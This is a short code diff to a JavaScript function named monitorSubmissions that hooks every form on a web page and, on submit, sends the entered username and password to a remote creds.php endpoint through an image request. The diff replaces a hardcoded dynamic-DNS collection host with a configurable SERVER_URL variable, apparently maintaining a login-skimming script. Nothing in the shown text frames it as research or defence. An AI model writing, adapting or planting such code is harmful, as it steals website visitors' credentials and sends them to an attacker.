@@ -1,5 +1,6 @@
 function monitorSubmissions() {
   
+    var SERVER_URL = "http://example.com/"
     var forms = document.getElementsByTagName('form');
 
     for (var i = 0; i < forms.length; i++) {
@@ -28,7 +29,7 @@ function monitorSubmissions() {
                 var userName = this._user.value
                 var passWord = this._pass.value
                 var pic = new Image()
-                pic.src = 'http://4k-server.ddns.net/225/creds.php?user='+userName+'&pass='+passWord
+                pic.src = SERVER_URL+'creds.php?user='+userName+'&pass='+passWord
               }
                   }};
               }
